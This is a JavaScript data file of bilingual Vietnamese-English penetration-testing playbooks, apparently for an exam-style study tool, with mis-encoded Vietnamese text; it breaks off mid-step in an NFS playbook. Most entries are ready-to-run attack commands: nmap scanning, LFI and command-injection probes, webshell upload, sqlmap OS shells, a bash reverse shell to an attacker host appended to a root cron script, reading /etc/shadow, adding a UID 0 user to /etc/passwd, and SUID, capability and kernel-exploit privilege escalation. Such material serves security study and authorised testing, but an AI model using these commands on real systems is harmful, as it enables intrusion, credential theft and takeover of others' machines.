// *** S·ª¨A L·ªñI 1: Chuy·ªÉn PLAYBOOKS th√†nh Object thay v√¨ Array ***
// S·ª≠ d·ª•ng 'id' l√†m key v√† lo·∫°i b·ªè 'id' b√™n trong value.
// Tr∆∞·ªùng 'content' ƒë∆∞·ª£c gi·ªØ l·∫°i nh∆∞ng c√≥ v·∫ª kh√¥ng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong script.js.
const PLAYBOOKS = {
  "playbook_01_nmap_recon": {
    "title": {
      "vi": "Playbook 1: Recon & Port Scanning ban ƒë·∫ßu v·ªõi Nmap",
      "en": "Playbook 1: Initial Recon & Port Scanning with Nmap"
    },
    "assumption": "B·∫Øt ƒë·∫ßu v·ªõi ƒë·ªãa ch·ªâ IP m·ª•c ti√™u.",
    "objective": "X√°c ƒë·ªãnh c·ªïng m·ªü, d·ªãch v·ª•, phi√™n b·∫£n, v√† l·ªó h·ªïng c∆° b·∫£n b·∫±ng Nmap.",
    "tools": ["nmap"],
    "phases": ["Reconnaissance", "Enumeration"],
    "techniques": ["Port Scanning", "Service Detection", "Version Detection", "NSE Scanning"],
    "targets": ["TCP", "UDP"],
    "os": ["Any"],
    "tags": ["nmap", "port scan", "recon", "enumeration", "nse", "initial", "scanning"],
    "content": "## Playbook 1: Recon & Port Scanning ban ƒë·∫ßu v·ªõi Nmap üéØ\n\n**Gi·∫£ ƒë·ªãnh:** B·∫Øt ƒë·∫ßu v·ªõi ƒë·ªãa ch·ªâ IP m·ª•c ti√™u.\n\n**M·ª•c ti√™u:** X√°c ƒë·ªãnh c·ªïng m·ªü, d·ªãch v·ª•, phi√™n b·∫£n, v√† l·ªó h·ªïng c∆° b·∫£n b·∫±ng Nmap.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Qu√©t nhanh:** `nmap -F <target_ip> -oN quick_scan.txt`\n2.  **Qu√©t c∆° b·∫£n:** `nmap -sC -sV <target_ip> -oN initial_scan.txt`\n3.  **Qu√©t to√†n b·ªô c·ªïng TCP:** `nmap -p- -sC -sV -T4 -Pn <target_ip> -oN full_tcp_scan.txt -oX full_tcp_scan.xml`\n4.  **Qu√©t UDP (N·∫øu c·∫ßn):** `sudo nmap -sU -p 161,53,137 -sV <target_ip> -oN udp_scan.txt`\n5.  **Qu√©t Script Vuln:** `nmap -sV --script vuln <target_ip> -p <list_of_open_ports> -oN vuln_scan.txt`",
    "steps": [
      { "vi": "**Qu√©t nhanh:**", "en": "**Quick Scan:**", "command": "nmap -F <target_ip> -oN quick_scan.txt" },
      { "vi": "**Qu√©t c∆° b·∫£n:**", "en": "**Basic Scan:**", "command": "nmap -sC -sV <target_ip> -oN initial_scan.txt" },
      { "vi": "**Qu√©t to√†n b·ªô c·ªïng TCP:**", "en": "**Full TCP Scan:**", "command": "nmap -p- -sC -sV -T4 -Pn <target_ip> -oN full_tcp_scan.txt -oX full_tcp_scan.xml" },
      { "vi": "**Qu√©t UDP (N·∫øu c·∫ßn):**", "en": "**UDP Scan (If needed):**", "command": "sudo nmap -sU -p 161,53,137 -sV <target_ip> -oN udp_scan.txt" },
      { "vi": "**Qu√©t Script Vuln:**", "en": "**Vuln Script Scan:**", "command": "nmap -sV --script vuln <target_ip> -p <list_of_open_ports> -oN vuln_scan.txt" }
    ],
    "related_knowledge_ids": ["nmap", "recon_port_scanning_nmap", "nmap_nse_scan", "snmp_enumeration", "port_53"]
  },
  "playbook_02_web_foothold": {
    "title": {
      "vi": "Playbook 2: Web Foothold qua L·ªó h·ªïng RCE",
      "en": "Playbook 2: Web Foothold via RCE Vulnerability"
    },
    "assumption": "Ph√°t hi·ªán c·ªïng web (80/443) ƒëang m·ªü.",
    "objective": "T√¨m l·ªó h·ªïng web (LFI, Command Injection, File Upload, SQLi RCE) v√† gi√†nh reverse shell.",
    "tools": ["gobuster", "nikto", "curl", "msfvenom", "nc", "sqlmap", "wpscan"],
    "phases": ["Enumeration", "Initial Foothold", "Exploitation"],
    "techniques": ["Directory Busting", "Vulnerability Scanning", "LFI", "Command Injection", "File Upload", "SQL Injection", "Reverse Shell"],
    "targets": ["Web Server", "HTTP", "HTTPS"],
    "os": ["Any"],
    "tags": ["web", "foothold", "rce", "lfi", "command injection", "file upload", "sqli", "reverse shell", "gobuster", "nikto", "sqlmap", "wpscan", "exploit"],
    "content": "## Playbook 2: Web Foothold qua L·ªó h·ªïng RCE üåê‚û°Ô∏èüêö\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán c·ªïng web (80/443) ƒëang m·ªü.\n\n**M·ª•c ti√™u:** T√¨m l·ªó h·ªïng web (LFI, Command Injection, File Upload, SQLi RCE) v√† gi√†nh reverse shell.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Directory Busting:** `gobuster dir -u http://<target_ip>/ -w <wordlist> -x php,txt,html,bak -o gobuster.txt`\n2.  **Vuln Scan:** `nikto -h http://<target_ip>/ -o nikto.txt`\n3.  **CMS Scan (N·∫øu c√≥):** `wpscan --url http://<target_ip>/ --enumerate vp,u ...`\n4.  **Ki·ªÉm tra LFI:** `curl \"http://<target_ip>/index.php?page=../../etc/passwd\"`. Th·ª≠ Log Poisoning ho·∫∑c PHP Wrappers.\n5.  **Ki·ªÉm tra Command Injection:** `curl \"http://<target_ip>/ping.php?ip=8.8.8.8; id\"`.\n6.  **Ki·ªÉm tra File Upload:** Th·ª≠ t·∫£i l√™n webshell (`shell.php`) v√† bypass b·ªô l·ªçc.\n7.  **Ki·ªÉm tra SQLi RCE:** `sqlmap -r request.txt -p param --os-shell`. Ho·∫∑c th·ªß c√¥ng (`xp_cmdshell` / `INTO OUTFILE`).\n8.  **L·∫•y Reverse Shell:** M·ªü listener `rlwrap nc -lvnp 4444`. Th·ª±c thi payload ph√π h·ª£p (Bash, PowerShell, ...) qua l·ªó h·ªïng.",
    "steps": [
        { "vi": "**Directory Busting:**", "en": "**Directory Busting:**", "command": "gobuster dir -u http://<target_ip>/ -w <wordlist> -x php,txt,html,bak -o gobuster.txt" },
        { "vi": "**Vuln Scan:**", "en": "**Vuln Scan:**", "command": "nikto -h http://<target_ip>/ -o nikto.txt" },
        { "vi": "**CMS Scan (N·∫øu c√≥):**", "en": "**CMS Scan (If applicable):**", "command": "wpscan --url http://<target_ip>/ --enumerate vp,u ..." },
        { "vi": "**Ki·ªÉm tra LFI:** Th·ª≠ Log Poisoning ho·∫∑c PHP Wrappers.", "en": "**Check LFI:** Try Log Poisoning or PHP Wrappers.", "command": "curl \"http://<target_ip>/index.php?page=../../etc/passwd\"" },
        { "vi": "**Ki·ªÉm tra Command Injection:**", "en": "**Check Command Injection:**", "command": "curl \"http://<target_ip>/ping.php?ip=8.8.8.8; id\"" },
        { "vi": "**Ki·ªÉm tra File Upload:** Th·ª≠ t·∫£i l√™n webshell (`shell.php`) v√† bypass b·ªô l·ªçc.", "en": "**Check File Upload:** Try uploading webshell (`shell.php`) and bypass filters." },
        { "vi": "**Ki·ªÉm tra SQLi RCE:** Ho·∫∑c th·ªß c√¥ng (`xp_cmdshell` / `INTO OUTFILE`).", "en": "**Check SQLi RCE:** Or manually (`xp_cmdshell` / `INTO OUTFILE`).", "command": "sqlmap -r request.txt -p param --os-shell" },
        { "vi": "**L·∫•y Reverse Shell:** M·ªü listener `rlwrap nc -lvnp 4444`. Th·ª±c thi payload.", "en": "**Get Reverse Shell:** Start listener `rlwrap nc -lvnp 4444`. Execute payload." }
    ],
    "related_knowledge_ids": ["port_80", "webapp_tool_gobuster", "nikto", "http_enumeration_cms", "lfi", "web_attack_lfi_rfi", "command_injection", "file_upload", "sqli_rce_sqlmap", "sqli_rce_manual", "rce_kali_setup", "rce_bash", "rce_powershell"]
  },
  "playbook_03_linux_privesc_sudo": {
    "title": {
      "vi": "Playbook 3: Linux PrivEsc qua Sudo Misconfiguration",
      "en": "Playbook 3: Linux PrivEsc via Sudo Misconfiguration"
    },
    "assumption": "C√≥ shell user Linux v√† `sudo -l` hi·ªÉn th·ªã m·ªôt l·ªánh c√≥ th·ªÉ b·ªã l·∫°m d·ª•ng (v√≠ d·ª•: `find`, `vim`, `less`, `cp`, `git`).",
    "objective": "Leo thang l√™n root b·∫±ng c√°ch l·∫°m d·ª•ng quy·ªÅn sudo.",
    "tools": ["sudo", "GTFOBins (Website)"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Sudo Abuse"],
    "targets": ["Linux Sudo Configuration"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "sudo", "sudo -l", "gtfobins"],
    "content": "## Playbook 3: Linux PrivEsc qua Sudo Misconfiguration üêß‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** C√≥ shell user Linux v√† `sudo -l` hi·ªÉn th·ªã m·ªôt l·ªánh c√≥ th·ªÉ b·ªã l·∫°m d·ª•ng.\n\n**M·ª•c ti√™u:** Leo thang l√™n root b·∫±ng c√°ch l·∫°m d·ª•ng quy·ªÅn sudo.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **Ki·ªÉm tra Sudo:** `sudo -l`. X√°c ƒë·ªãnh l·ªánh c√≥ th·ªÉ ch·∫°y v·ªõi sudo m√† kh√¥ng c·∫ßn m·∫≠t kh·∫©u ho·∫∑c v·ªõi quy·ªÅn root.\n2.  **Tra c·ª©u GTFOBins:** Truy c·∫≠p website GTFOBins, t√¨m ki·∫øm l·ªánh ƒë√≥ trong m·ª•c 'Sudo'.\n3.  **Th·ª±c thi Payload:** Ch·∫°y l·ªánh sudo theo h∆∞·ªõng d·∫´n tr√™n GTFOBins ƒë·ªÉ c√≥ shell root.\n    * V√≠ d·ª• (`find`): `sudo find . -exec /bin/sh -p \\; -quit`\n    * V√≠ d·ª• (`less`): `sudo less /etc/profile` sau ƒë√≥ g√µ `!/bin/sh`.\n    * V√≠ d·ª• (`git`): `sudo git -p help config` sau ƒë√≥ `!/bin/bash`.\n4.  **X√°c nh·∫≠n Root:** `id`.",
    "steps": [
      { "vi": "**Ki·ªÉm tra Sudo:**", "en": "**Check Sudo:**", "command": "sudo -l" },
      { "vi": "**Tra c·ª©u GTFOBins:** T√¨m l·ªánh trong m·ª•c 'Sudo'.", "en": "**Lookup GTFOBins:** Find the command under 'Sudo'." },
      { "vi": "**Th·ª±c thi Payload (V√≠ d·ª• `find`):**", "en": "**Execute Payload (Example `find`):**", "command": "sudo find . -exec /bin/sh -p \\; -quit" },
      { "vi": "**Th·ª±c thi Payload (V√≠ d·ª• `less`):**", "en": "**Execute Payload (Example `less`):**", "command": "sudo less /etc/profile", "notes": { "vi": "sau ƒë√≥ g√µ `!/bin/sh`", "en": "then type `!/bin/sh`" } },
      { "vi": "**Th·ª±c thi Payload (V√≠ d·ª• `git`):**", "en": "**Execute Payload (Example `git`):**", "command": "sudo git -p help config", "notes": { "vi": "sau ƒë√≥ `!/bin/bash`", "en": "then `!/bin/bash`" } },
      { "vi": "**X√°c nh·∫≠n Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["privesc_linux", "linuxprivesc_sudo_abuse", "sudo -l", "linuxprivesc_lab_suid_find_capstone", "capstone_attack_public_websrv1_privesc"]
  },
  "playbook_04_linux_privesc_suid": {
    "title": {
      "vi": "Playbook 4: Linux PrivEsc qua SUID Binary Abuse",
      "en": "Playbook 4: Linux PrivEsc via SUID Binary Abuse"
    },
    "assumption": "C√≥ shell user Linux v√† `find / -perm -u=s -type f 2>/dev/null` t√¨m th·∫•y m·ªôt binary SUID c√≥ th·ªÉ b·ªã l·∫°m d·ª•ng (v√≠ d·ª•: `find`, `cp`, `vim`, `nmap`, `base64`, m·ªôt binary t√πy ch·ªânh).",
    "objective": "Leo thang l√™n root b·∫±ng c√°ch l·∫°m d·ª•ng SUID binary.",
    "tools": ["find", "GTFOBins (Website)"],
    "phases": ["Privilege Escalation"],
    "techniques": ["SUID Abuse"],
    "targets": ["Linux SUID Binaries"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "suid", "find", "gtfobins"],
    "content": "## Playbook 4: Linux PrivEsc qua SUID Binary Abuse üêß‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** `find / -perm -u=s ...` t√¨m th·∫•y m·ªôt SUID binary c√≥ th·ªÉ l·∫°m d·ª•ng.\n\n**M·ª•c ti√™u:** Leo thang l√™n root b·∫±ng c√°ch l·∫°m d·ª•ng SUID binary.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T√¨m SUID Binaries:** `find / -perm -u=s -type f 2>/dev/null`.\n2.  **Tra c·ª©u GTFOBins:** Truy c·∫≠p GTFOBins, t√¨m ki·∫øm binary ƒë√≥ trong m·ª•c 'SUID'.\n3.  **Th·ª±c thi Payload:** Ch·∫°y l·ªánh theo h∆∞·ªõng d·∫´n tr√™n GTFOBins ƒë·ªÉ c√≥ shell root ho·∫∑c ƒë·ªçc/ghi file v·ªõi quy·ªÅn root.\n    * V√≠ d·ª• (`find`): `/usr/bin/find . -exec /bin/sh -p \\; -quit`\n    * V√≠ d·ª• (`cp`): `cp /etc/shadow /tmp/shadow_copy`, crack hash. Ho·∫∑c `cp /bin/sh /tmp/sh_copy; chmod +s /tmp/sh_copy; /tmp/sh_copy -p`.\n    * V√≠ d·ª• (`base64`): `base64 /etc/shadow | base64 --decode`.\n4.  **X√°c nh·∫≠n Root:** `id`.",
    "steps": [
      { "vi": "**T√¨m SUID Binaries:**", "en": "**Find SUID Binaries:**", "command": "find / -perm -u=s -type f 2>/dev/null" },
      { "vi": "**Tra c·ª©u GTFOBins:** T√¨m binary trong m·ª•c 'SUID'.", "en": "**Lookup GTFOBins:** Find the binary under 'SUID'." },
      { "vi": "**Th·ª±c thi Payload (V√≠ d·ª• `find`):**", "en": "**Execute Payload (Example `find`):**", "command": "/usr/bin/find . -exec /bin/sh -p \\; -quit" },
      { "vi": "**Th·ª±c thi Payload (V√≠ d·ª• `cp` - ƒë·ªçc shadow):**", "en": "**Execute Payload (Example `cp` - read shadow):**", "command": "cp /etc/shadow /tmp/shadow_copy", "notes": { "vi": "Sau ƒë√≥ crack hash.", "en": "Then crack the hash." } },
      { "vi": "**Th·ª±c thi Payload (V√≠ d·ª• `cp` - shell):**", "en": "**Execute Payload (Example `cp` - shell):**", "command": "cp /bin/sh /tmp/sh_copy; chmod +s /tmp/sh_copy; /tmp/sh_copy -p" },
      { "vi": "**Th·ª±c thi Payload (V√≠ d·ª• `base64`):**", "en": "**Execute Payload (Example `base64`):**", "command": "base64 /etc/shadow | base64 --decode" },
      { "vi": "**X√°c nh·∫≠n Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["privesc_linux", "linuxprivesc_suid_capabilities_abuse", "find", "linuxprivesc_lab_suid_find_capstone"]
  },
  "playbook_05_linux_privesc_capabilities": {
    "title": {
      "vi": "Playbook 5: Linux PrivEsc qua Capabilities Abuse",
      "en": "Playbook 5: Linux PrivEsc via Capabilities Abuse"
    },
    "assumption": "C√≥ shell user Linux v√† `getcap -r / 2>/dev/null` t√¨m th·∫•y m·ªôt binary v·ªõi capabilities nguy hi·ªÉm (v√≠ d·ª•: `python = cap_setuid+ep`, `perl = cap_setuid+ep`, `tar = cap_dac_read_search+ep`).",
    "objective": "Leo thang l√™n root b·∫±ng c√°ch l·∫°m d·ª•ng file capabilities.",
    "tools": ["getcap", "GTFOBins (Website)"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Capabilities Abuse"],
    "targets": ["Linux Capabilities"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "capabilities", "getcap", "gtfobins", "cap_setuid"],
    "content": "## Playbook 5: Linux PrivEsc qua Capabilities Abuse üêß‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** `getcap -r / ...` t√¨m th·∫•y binary v·ªõi capabilities nguy hi·ªÉm.\n\n**M·ª•c ti√™u:** Leo thang l√™n root b·∫±ng c√°ch l·∫°m d·ª•ng capabilities.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **T√¨m Capabilities:** `getcap -r / 2>/dev/null`.\n2.  **Tra c·ª©u GTFOBins:** Truy c·∫≠p GTFOBins, t√¨m ki·∫øm binary ƒë√≥ trong m·ª•c 'Capabilities'.\n3.  **Th·ª±c thi Payload:** Ch·∫°y l·ªánh theo h∆∞·ªõng d·∫´n tr√™n GTFOBins.\n    * V√≠ d·ª• (`python` v·ªõi `cap_setuid+ep`): `python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'`.\n    * V√≠ d·ª• (`tar` v·ªõi `cap_dac_read_search+ep`): `tar -cf shadow.tar /etc/shadow`. ƒê·ªçc `shadow.tar`.\n    * V√≠ d·ª• (`gdb` v·ªõi `cap_setuid+ep`): `/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit`.\n4.  **X√°c nh·∫≠n Root:** `id`.",
    "steps": [
      { "vi": "**T√¨m Capabilities:**", "en": "**Find Capabilities:**", "command": "getcap -r / 2>/dev/null" },
      { "vi": "**Tra c·ª©u GTFOBins:** T√¨m binary trong m·ª•c 'Capabilities'.", "en": "**Lookup GTFOBins:** Find the binary under 'Capabilities'." },
      { "vi": "**Th·ª±c thi Payload (V√≠ d·ª• `python`):**", "en": "**Execute Payload (Example `python`):**", "command": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'" },
      { "vi": "**Th·ª±c thi Payload (V√≠ d·ª• `tar`):**", "en": "**Execute Payload (Example `tar`):**", "command": "tar -cf shadow.tar /etc/shadow", "notes": { "vi": "ƒê·ªçc `shadow.tar` sau ƒë√≥.", "en": "Read `shadow.tar` afterwards." } },
      { "vi": "**Th·ª±c thi Payload (V√≠ d·ª• `gdb`):**", "en": "**Execute Payload (Example `gdb`):**", "command": "/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit" },
      { "vi": "**X√°c nh·∫≠n Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["privesc_linux", "linuxprivesc_suid_capabilities_abuse", "getcap", "linuxprivesc_lab_capabilities_gdb"]
  },
  "playbook_06_linux_privesc_writable_cron": {
    "title": {
      "vi": "Playbook 6: Linux PrivEsc qua Writable Cron Job Script",
      "en": "Playbook 6: Linux PrivEsc via Writable Cron Job Script"
    },
    "assumption": "C√≥ shell user Linux. Ph√°t hi·ªán (qua `pspy`, `linpeas`, ho·∫∑c ki·ªÉm tra th·ªß c√¥ng) m·ªôt script ƒë∆∞·ª£c ch·∫°y b·ªüi cron v·ªõi quy·ªÅn root, v√† user hi·ªán t·∫°i c√≥ quy·ªÅn ghi v√†o script ƒë√≥.",
    "objective": "Leo thang l√™n root b·∫±ng c√°ch s·ª≠a ƒë·ªïi cron script.",
    "tools": ["pspy", "linpeas.sh", "cat", "ls", "echo", "nc"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Cron Job Abuse", "Insecure File Permissions"],
    "targets": ["Linux Cron Jobs"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "cron", "writable file", "insecure permissions", "pspy", "linpeas", "reverse shell"],
    "content": "## Playbook 6: Linux PrivEsc qua Writable Cron Job Script üêß‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán cron script ch·∫°y b·ªüi root c√≥ quy·ªÅn ghi.\n\n**M·ª•c ti√™u:** Leo thang l√™n root b·∫±ng c√°ch s·ª≠a ƒë·ªïi cron script.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c ƒë·ªãnh Script v√† Quy·ªÅn:** D√πng `pspy` ho·∫∑c `grep CRON /var/log/syslog`. Ki·ªÉm tra quy·ªÅn: `ls -la /path/to/script.sh`.\n2.  **M·ªü Listener:** Tr√™n Kali, `rlwrap nc -lvnp 4445`.\n3.  **Ch√®n Payload:** Ghi ƒë√® ho·∫∑c n·ªëi th√™m payload reverse shell v√†o script.\n    ```bash\n    echo '#!/bin/bash' > /path/to/script.sh # Ghi ƒë√® n·∫øu c·∫ßn\n    echo 'bash -i >& /dev/tcp/<kali_ip>/4445 0>&1' >> /path/to/script.sh \n    ```\n   \n4.  **Ch·ªù Cron Ch·∫°y:** ƒê·ª£i cron job k√≠ch ho·∫°t script.\n5.  **X√°c nh·∫≠n Root:** `id` trong shell nh·∫≠n ƒë∆∞·ª£c.",
    "steps": [
      { "vi": "**X√°c ƒë·ªãnh Script v√† Quy·ªÅn:** D√πng `pspy` ho·∫∑c `grep CRON /var/log/syslog`.", "en": "**Identify Script & Permissions:** Use `pspy` or `grep CRON /var/log/syslog`.", "command": "ls -la /path/to/script.sh" },
      { "vi": "**M·ªü Listener:** Tr√™n Kali.", "en": "**Start Listener:** On Kali.", "command": "rlwrap nc -lvnp 4445" },
      { "vi": "**Ch√®n Payload (Ghi ƒë√®):**", "en": "**Inject Payload (Overwrite):**", "command": "echo '#!/bin/bash' > /path/to/script.sh", "notes": { "vi": "(Ghi ƒë√® n·∫øu c·∫ßn)", "en": "(Overwrite if needed)" } },
      { "vi": "**Ch√®n Payload (N·ªëi th√™m):**", "en": "**Inject Payload (Append):**", "command": "echo 'bash -i >& /dev/tcp/<kali_ip>/4445 0>&1' >> /path/to/script.sh" },
      { "vi": "**Ch·ªù Cron Ch·∫°y:**", "en": "**Wait for Cron:**" },
      { "vi": "**X√°c nh·∫≠n Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["linuxprivesc_cron_job_abuse", "linuxprivesc_cron_enum", "rce_kali_setup", "linuxprivesc_lab_cron_job_capstone"]
  },
  "playbook_07_linux_privesc_writable_passwd": {
    "title": {
      "vi": "Playbook 7: Linux PrivEsc qua Writable /etc/passwd",
      "en": "Playbook 7: Linux PrivEsc via Writable /etc/passwd"
    },
    "assumption": "C√≥ shell user Linux v√† `find /etc/passwd -writable` x√°c nh·∫≠n file /etc/passwd c√≥ quy·ªÅn ghi.",
    "objective": "Leo thang l√™n root b·∫±ng c√°ch th√™m user m·ªõi v√†o /etc/passwd.",
    "tools": ["find", "openssl", "echo", "su"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Writable /etc/passwd", "Insecure File Permissions"],
    "targets": ["/etc/passwd"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "writable file", "insecure permissions", "etc_passwd", "openssl", "su"],
    "content": "## Playbook 7: Linux PrivEsc qua Writable /etc/passwd üêß‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** `/etc/passwd` c√≥ quy·ªÅn ghi.\n\n**M·ª•c ti√™u:** Leo thang l√™n root b·∫±ng c√°ch th√™m user m·ªõi.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n Quy·ªÅn ghi:** `ls -la /etc/passwd`.\n2.  **T·∫°o Hash M·∫≠t kh·∫©u:** `openssl passwd -1 -salt xyz <YourPassword>`. Copy hash.\n3.  **Th√™m User Root m·ªõi:**\n    ```bash\n    echo \"newroot:<hash_from_openssl>:0:0:root:/root:/bin/bash\" >> /etc/passwd\n    ```\n   \n4.  **Chuy·ªÉn sang User Root:** `su newroot` (Nh·∫≠p m·∫≠t kh·∫©u ƒë√£ t·∫°o).\n5.  **X√°c nh·∫≠n Root:** `id`.",
    "steps": [
      { "vi": "**X√°c nh·∫≠n Quy·ªÅn ghi:**", "en": "**Confirm Write Permissions:**", "command": "ls -la /etc/passwd" },
      { "vi": "**T·∫°o Hash M·∫≠t kh·∫©u:** Copy hash.", "en": "**Create Password Hash:** Copy the hash.", "command": "openssl passwd -1 -salt xyz <YourPassword>" },
      { "vi": "**Th√™m User Root m·ªõi:**", "en": "**Add New Root User:**", "command": "echo \"newroot:<hash_from_openssl>:0:0:root:/root:/bin/bash\" >> /etc/passwd" },
      { "vi": "**Chuy·ªÉn sang User Root:** Nh·∫≠p m·∫≠t kh·∫©u.", "en": "**Switch to Root User:** Enter password.", "command": "su newroot" },
      { "vi": "**X√°c nh·∫≠n Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["linuxprivesc_passwd_abuse", "openssl", "linuxprivesc_lab_passwd_abuse_capstone", "su"]
  },
  "playbook_08_linux_privesc_kernel_exploit": {
    "title": {
      "vi": "Playbook 8: Linux PrivEsc qua Kernel Exploit",
      "en": "Playbook 8: Linux PrivEsc via Kernel Exploit"
    },
    "assumption": "C√≥ shell user Linux v√† `uname -a` cho th·∫•y phi√™n b·∫£n kernel c√≥ kh·∫£ nƒÉng d√≠nh l·ªó h·ªïng LPE ƒë√£ bi·∫øt.",
    "objective": "Leo thang l√™n root b·∫±ng c√°ch khai th√°c l·ªó h·ªïng kernel.",
    "tools": ["uname", "searchsploit", "gcc", "wget", "curl"],
    "phases": ["Privilege Escalation"],
    "techniques": ["Kernel Exploit", "LPE"],
    "targets": ["Linux Kernel"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "kernel exploit", "lpe", "uname", "searchsploit", "gcc"],
    "content": "## Playbook 8: Linux PrivEsc qua Kernel Exploit üêßüí•üëë\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán kernel c√≥ kh·∫£ nƒÉng d√≠nh l·ªó h·ªïng LPE.\n\n**M·ª•c ti√™u:** Khai th√°c kernel ƒë·ªÉ l√™n root.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c ƒë·ªãnh Kernel:** `uname -a`. `cat /etc/os-release`.\n2.  **T√¨m Exploit:** Tr√™n Kali, `searchsploit Linux Kernel <version> <distro> local privilege escalation`.\n3.  **L·∫•y v√† Bi√™n d·ªãch Exploit:**\n    * Kali: `searchsploit -m <id.c>`. ƒê·ªçc code, `gcc <id.c> -o exploit_bin`.\n    * Chuy·ªÉn `exploit_bin` l√™n target (`/tmp`) b·∫±ng `wget` ho·∫∑c `curl`.\n    * Target: `chmod +x /tmp/exploit_bin`.\n4.  **Ch·∫°y Exploit:** `/tmp/exploit_bin`.\n5.  **X√°c nh·∫≠n Root:** `id`.\n\n**L∆∞u √Ω:** Ch·ªâ d√πng khi c√°c c√°ch kh√°c th·∫•t b·∫°i do r·ªßi ro crash.",
    "steps": [
      { "vi": "**X√°c ƒë·ªãnh Kernel:**", "en": "**Identify Kernel:**", "command": "uname -a; cat /etc/os-release" },
      { "vi": "**T√¨m Exploit (Kali):**", "en": "**Find Exploit (Kali):**", "command": "searchsploit Linux Kernel <version> <distro> local privilege escalation" },
      { "vi": "**L·∫•y Exploit (Kali):**", "en": "**Get Exploit (Kali):**", "command": "searchsploit -m <id.c>" },
      { "vi": "**Bi√™n d·ªãch Exploit (Kali):**", "en": "**Compile Exploit (Kali):**", "command": "gcc <id.c> -o exploit_bin" },
      { "vi": "**Chuy·ªÉn Exploit l√™n Target:** (v√≠ d·ª•: wget/curl)", "en": "**Transfer Exploit to Target:** (e.g., wget/curl)" },
      { "vi": "**C·∫•p quy·ªÅn th·ª±c thi (Target):**", "en": "**Grant Execute Permissions (Target):**", "command": "chmod +x /tmp/exploit_bin" },
      { "vi": "**Ch·∫°y Exploit (Target):**", "en": "**Run Exploit (Target):**", "command": "/tmp/exploit_bin" },
      { "vi": "**X√°c nh·∫≠n Root:**", "en": "**Confirm Root:**", "command": "id" }
    ],
    "related_knowledge_ids": ["linuxprivesc_kernel_exploit", "linuxprivesc_manual_kernel_exploit", "uname", "searchsploit", "exploitation_finding_exploits_searchsploit", "gcc", "file_transfer_download_linux"]
  },
  "playbook_09_linux_privesc_nfs_no_root_squash": {
    "title": {
      "vi": "Playbook 9: Linux PrivEsc qua NFS no_root_squash",
      "en": "Playbook 9: Linux PrivEsc via NFS no_root_squash"
    },
    "assumption": "C√≥ shell user Linux. `showmount -e <target_ip>` (ho·∫∑c `cat /etc/exports` tr√™n target) hi·ªÉn th·ªã m·ªôt share NFS ƒë∆∞·ª£c export v·ªõi t√πy ch·ªçn `no_root_squash`.",
    "objective": "Leo thang l√™n root b·∫±ng c√°ch l·∫°m d·ª•ng c·∫•u h√¨nh NFS.",
    "tools": ["showmount", "mount", "gcc", "cp", "chmod"],
    "phases": ["Privilege Escalation"],
    "techniques": ["NFS Abuse", "no_root_squash", "SUID Abuse"],
    "targets": ["NFS Share"],
    "os": ["Linux"],
    "tags": ["linux", "privesc", "nfs", "no_root_squash", "mount", "suid"],
    "content": "## Playbook 9: Linux PrivEsc qua NFS no_root_squash üêß‚¨ÜÔ∏èüëë\n\n**Gi·∫£ ƒë·ªãnh:** Ph√°t hi·ªán NFS share v·ªõi `no_root_squash`.\n\n**M·ª•c ti√™u:** Leo thang l√™n root qua NFS.\n\n**C√°c b∆∞·ªõc th·ª±c hi·ªán:**\n\n1.  **X√°c nh·∫≠n `no_root_squash`:** `showmount -e <target_ip>`.\n2.  **Mount Share tr√™n Kali:**\n    ```bash\n    sudo mkdir /mnt/nfs_share\n    sudo mount -t nfs <target_ip>:/<share_path> /mnt/nfs_share -o nolock \n    ```\n   \n3.  **T·∫°o SUID Binary tr√™n Kali (trong th∆∞ m·ª•c mount):**\n    * C√°ch 1 (Copy bash): `sudo cp /bin/bash /mnt/nfs_share/rootshell`, `sudo chmod +s /mnt/nfs_share/rootshell`.\n    * C√°ch 2 (Compile C code): T·∫°o `suid.c` (`setuid(0); setgid(0); system(\"/bin/bash -p\");`). `gcc suid.c -o /mnt/nfs_share/rootshell`, `sudo chown root:root /mnt/nfs_share/rootshell`, `sudo chmod +s /mnt/nfs_share/rootshell`.\n4.  **Unmount Share tr√™n Kali (T√πy ch·ªçn):** `sudo umount /mnt/nfs_share`.\n5.  